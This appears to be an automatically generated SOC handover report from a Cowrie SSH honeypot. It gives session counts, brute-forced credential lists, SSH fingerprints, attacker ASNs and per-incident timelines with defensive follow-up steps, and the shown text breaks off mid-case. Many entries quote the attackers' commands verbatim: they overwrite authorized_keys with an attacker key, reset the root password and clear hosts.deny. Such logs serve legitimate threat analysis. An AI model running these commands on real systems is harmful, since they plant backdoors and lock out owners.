# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-07 |
| **Generated At** | 2026-04-07T16:56:44Z |
| **Shift Time** | 16:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **96** |
| Confirmed Threats | **95** |
| False Positives Filtered | **1** (1.0%) |
| Unique Attacker IPs | **7** |
| Countries of Origin | **4** |
| High Severity Cases | **38** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **58** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **77** |
| Unique Credential Pairs | **43** |
| Unique Usernames | **16** |
| Unique Passwords | **43** |
| Successful Auth Pairs | **24** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `345gs5662d34` | 18 |
| `postgres` | 4 |
| `n8n` | 2 |
| `test` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `n8n16` | 1 |
| `Root2019#` | 1 |
| `ttest` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 18 |
| `n8n` | `n8n16` | 1 |
| `root` | `Root2019#` | 1 |
| `ttest` | `ttest` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root2019#` | `115.190.87.35` | 2026-04-07T15:12:43 |
| `root` | `3245gs5662d34` | `115.190.87.35` | 2026-04-07T15:12:51 |
| `root` | `promo123` | `38.19.156.18` | 2026-04-07T15:19:13 |
| `root` | `3245gs5662d34` | `38.19.156.18` | 2026-04-07T15:19:20 |
| `root` | `QWE@1234` | `38.19.156.18` | 2026-04-07T15:22:48 |
| `root` | `1q2w3e4r5tA` | `38.19.156.18` | 2026-04-07T15:26:20 |
| `root` | `root8888@` | `38.19.156.18` | 2026-04-07T15:28:10 |
| `root` | `Letmein123!` | `38.19.156.18` | 2026-04-07T15:29:57 |
| `root` | `12345678Qq` | `38.19.156.18` | 2026-04-07T15:31:50 |
| `root` | `tencent@2025` | `38.19.156.18` | 2026-04-07T15:39:11 |
| `root` | `Root12345@` | `38.19.156.18` | 2026-04-07T15:42:47 |
| `root` | `a12345678915` | `38.19.156.18` | 2026-04-07T15:48:23 |
| `root` | `Aa654321` | `38.19.156.18` | 2026-04-07T15:52:04 |
| `root` | `XXaa111` | `38.19.156.18` | 2026-04-07T15:53:53 |
| `root` | `123456@w` | `38.19.156.18` | 2026-04-07T15:57:21 |
| `root` | `Qwerty@#` | `101.126.91.34` | 2026-04-07T16:39:43 |
| `root` | `root2018..` | `102.210.149.130` | 2026-04-07T16:42:25 |
| `root` | `3245gs5662d34` | `102.210.149.130` | 2026-04-07T16:42:29 |
| `root` | `qazxswedc123` | `102.210.149.130` | 2026-04-07T16:44:36 |
| `root` | `root1111111@` | `101.126.91.34` | 2026-04-07T16:45:24 |
| `root` | `3245gs5662d34` | `101.126.91.34` | 2026-04-07T16:45:30 |
| `root` | `ASD123` | `101.126.91.34` | 2026-04-07T16:45:47 |
| `root` | `qazwsx8888@@` | `102.210.149.130` | 2026-04-07T16:46:30 |
| `root` | `Passw0rd@` | `102.210.149.130` | 2026-04-07T16:48:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **96** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 93 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 88 | 5 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 88 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:0hGQZw1STAtD"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.91.34`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.210.149.130`, `101.126.91.34`, `38.19.156.18`, `115.190.87.35`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **7** |
| Unique ASNs | **6** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS328847` | THE KONZA TECHNOPOLIS DEVELOPMENT AUTHORITY | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS27843` | ON EMPRESAS S.A.C. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (38)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-141aab3fcbbb

| Field | Detail |
|---|---|
| **Source IP** | `115.190.87[.]35` |
| **First Seen** | 2026-04-07 15:12 |
| **Last Seen** | 2026-04-07 15:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:12:43` | `cowrie.session.connect` |
| `2026-04-07 15:12:43` | `cowrie.client.version` |
| `2026-04-07 15:12:43` | `cowrie.client.kex` |
| `2026-04-07 15:12:43` | `cowrie.login.success` |
| `2026-04-07 15:12:44` | `cowrie.session.params` |
| `2026-04-07 15:12:44` | `cowrie.command.input` |
| `2026-04-07 15:12:44` | `cowrie.command.failed` |
| `2026-04-07 15:12:44` | `cowrie.log.closed` |
| `2026-04-07 15:12:44` | `cowrie.session.params` |
| `2026-04-07 15:12:44` | `cowrie.command.input` |
| `2026-04-07 15:12:44` | `cowrie.session.file_download` |
| `2026-04-07 15:12:44` | `cowrie.log.closed` |
| `2026-04-07 15:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `115.190.87[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80962c152273

| Field | Detail |
|---|---|
| **Source IP** | `115.190.87[.]35` |
| **First Seen** | 2026-04-07 15:12 |
| **Last Seen** | 2026-04-07 15:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:12:48` | `cowrie.session.connect` |
| `2026-04-07 15:12:48` | `cowrie.client.version` |
| `2026-04-07 15:12:48` | `cowrie.client.kex` |
| `2026-04-07 15:12:51` | `cowrie.login.success` |
| `2026-04-07 15:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.87[.]35` to AbuseIPDB if not already reported
- [ ] Block `115.190.87[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34e58cf9ea92

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:19 |
| **Last Seen** | 2026-04-07 15:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:19:12` | `cowrie.session.connect` |
| `2026-04-07 15:19:12` | `cowrie.client.version` |
| `2026-04-07 15:19:12` | `cowrie.client.kex` |
| `2026-04-07 15:19:13` | `cowrie.login.success` |
| `2026-04-07 15:19:14` | `cowrie.session.params` |
| `2026-04-07 15:19:14` | `cowrie.command.input` |
| `2026-04-07 15:19:14` | `cowrie.command.failed` |
| `2026-04-07 15:19:14` | `cowrie.log.closed` |
| `2026-04-07 15:19:15` | `cowrie.session.params` |
| `2026-04-07 15:19:15` | `cowrie.command.input` |
| `2026-04-07 15:19:15` | `cowrie.session.file_download` |
| `2026-04-07 15:19:15` | `cowrie.log.closed` |
| `2026-04-07 15:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f84038093a9

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:19 |
| **Last Seen** | 2026-04-07 15:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:19:19` | `cowrie.session.connect` |
| `2026-04-07 15:19:19` | `cowrie.client.version` |
| `2026-04-07 15:19:19` | `cowrie.client.kex` |
| `2026-04-07 15:19:20` | `cowrie.login.success` |
| `2026-04-07 15:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0da2ff7da6b

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:22 |
| **Last Seen** | 2026-04-07 15:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:22:47` | `cowrie.session.connect` |
| `2026-04-07 15:22:47` | `cowrie.client.version` |
| `2026-04-07 15:22:47` | `cowrie.client.kex` |
| `2026-04-07 15:22:48` | `cowrie.login.success` |
| `2026-04-07 15:22:49` | `cowrie.session.params` |
| `2026-04-07 15:22:49` | `cowrie.command.input` |
| `2026-04-07 15:22:49` | `cowrie.command.failed` |
| `2026-04-07 15:22:49` | `cowrie.log.closed` |
| `2026-04-07 15:22:50` | `cowrie.session.params` |
| `2026-04-07 15:22:50` | `cowrie.command.input` |
| `2026-04-07 15:22:50` | `cowrie.session.file_download` |
| `2026-04-07 15:22:50` | `cowrie.log.closed` |
| `2026-04-07 15:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a02fec6f7b85

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:22 |
| **Last Seen** | 2026-04-07 15:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:22:54` | `cowrie.session.connect` |
| `2026-04-07 15:22:54` | `cowrie.client.version` |
| `2026-04-07 15:22:54` | `cowrie.client.kex` |
| `2026-04-07 15:22:55` | `cowrie.login.success` |
| `2026-04-07 15:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34d46407fd91

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:26 |
| **Last Seen** | 2026-04-07 15:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:26:19` | `cowrie.session.connect` |
| `2026-04-07 15:26:19` | `cowrie.client.version` |
| `2026-04-07 15:26:19` | `cowrie.client.kex` |
| `2026-04-07 15:26:20` | `cowrie.login.success` |
| `2026-04-07 15:26:21` | `cowrie.session.params` |
| `2026-04-07 15:26:21` | `cowrie.command.input` |
| `2026-04-07 15:26:21` | `cowrie.command.failed` |
| `2026-04-07 15:26:21` | `cowrie.log.closed` |
| `2026-04-07 15:26:22` | `cowrie.session.params` |
| `2026-04-07 15:26:22` | `cowrie.command.input` |
| `2026-04-07 15:26:22` | `cowrie.session.file_download` |
| `2026-04-07 15:26:22` | `cowrie.log.closed` |
| `2026-04-07 15:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9a7de71e9a

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:26 |
| **Last Seen** | 2026-04-07 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:26:26` | `cowrie.session.connect` |
| `2026-04-07 15:26:26` | `cowrie.client.version` |
| `2026-04-07 15:26:26` | `cowrie.client.kex` |
| `2026-04-07 15:26:27` | `cowrie.login.success` |
| `2026-04-07 15:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a40646a8759

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:28 |
| **Last Seen** | 2026-04-07 15:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:28:08` | `cowrie.session.connect` |
| `2026-04-07 15:28:08` | `cowrie.client.version` |
| `2026-04-07 15:28:08` | `cowrie.client.kex` |
| `2026-04-07 15:28:10` | `cowrie.login.success` |
| `2026-04-07 15:28:10` | `cowrie.session.params` |
| `2026-04-07 15:28:10` | `cowrie.command.input` |
| `2026-04-07 15:28:10` | `cowrie.command.failed` |
| `2026-04-07 15:28:11` | `cowrie.log.closed` |
| `2026-04-07 15:28:11` | `cowrie.session.params` |
| `2026-04-07 15:28:11` | `cowrie.command.input` |
| `2026-04-07 15:28:12` | `cowrie.session.file_download` |
| `2026-04-07 15:28:12` | `cowrie.log.closed` |
| `2026-04-07 15:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19cd1b252fc8

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:28 |
| **Last Seen** | 2026-04-07 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:28:15` | `cowrie.session.connect` |
| `2026-04-07 15:28:15` | `cowrie.client.version` |
| `2026-04-07 15:28:15` | `cowrie.client.kex` |
| `2026-04-07 15:28:16` | `cowrie.login.success` |
| `2026-04-07 15:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc8c34669a0

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:29 |
| **Last Seen** | 2026-04-07 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:29:56` | `cowrie.session.connect` |
| `2026-04-07 15:29:56` | `cowrie.client.version` |
| `2026-04-07 15:29:56` | `cowrie.client.kex` |
| `2026-04-07 15:29:57` | `cowrie.login.success` |
| `2026-04-07 15:29:58` | `cowrie.session.params` |
| `2026-04-07 15:29:58` | `cowrie.command.input` |
| `2026-04-07 15:29:58` | `cowrie.command.failed` |
| `2026-04-07 15:29:58` | `cowrie.log.closed` |
| `2026-04-07 15:29:59` | `cowrie.session.params` |
| `2026-04-07 15:29:59` | `cowrie.command.input` |
| `2026-04-07 15:29:59` | `cowrie.session.file_download` |
| `2026-04-07 15:29:59` | `cowrie.log.closed` |
| `2026-04-07 15:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3057a0d9e85c

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:30 |
| **Last Seen** | 2026-04-07 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 15:30:03` | `cowrie.session.connect` |
| `2026-04-07 15:30:03` | `cowrie.client.version` |
| `2026-04-07 15:30:03` | `cowrie.client.kex` |
| `2026-04-07 15:30:04` | `cowrie.login.success` |
| `2026-04-07 15:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d265babdd7

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-07 15:31 |
| **Last Seen** | 2026-04-07 15:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
